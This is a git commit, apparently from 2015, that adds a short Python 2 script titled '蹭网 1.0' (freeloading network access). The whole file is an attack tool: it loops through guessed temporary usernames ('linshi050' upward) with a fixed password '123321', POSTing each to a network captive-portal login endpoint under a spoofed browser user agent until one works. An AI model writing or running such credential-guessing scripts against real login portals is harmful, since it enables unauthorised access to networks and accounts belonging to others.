fd4d92636fa3998865d87f895d147b424582eceb
chmraping <mraping@qq.com>
2015-06-08 17:36:57 +0800

    蹭网 1.0

---
+++ login.py
@@ -0,0 +1,26 @@
+# coding=utf8
+import urllib2
+import urllib
+
+
+url = 'http://192.0.0.6/cgi-bin/do_login'
+count = 50
+
+headers = {'User-agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'}
+success = False
+while not success:
+	user = "linshi0{0}".format(count)
+	post_data = {'username': user, 'password': '123321'}
+	data = urllib.urlencode(post_data)
+	req = urllib2.Request(url, data, headers)
+	response = urllib2.urlopen(req)
+	page = response.read()
+	try:
+		# print page
+		int(page)
+		success = True
+		print "%s login success!" % user
+	except ValueError:
+		count += 1
+		continue
+
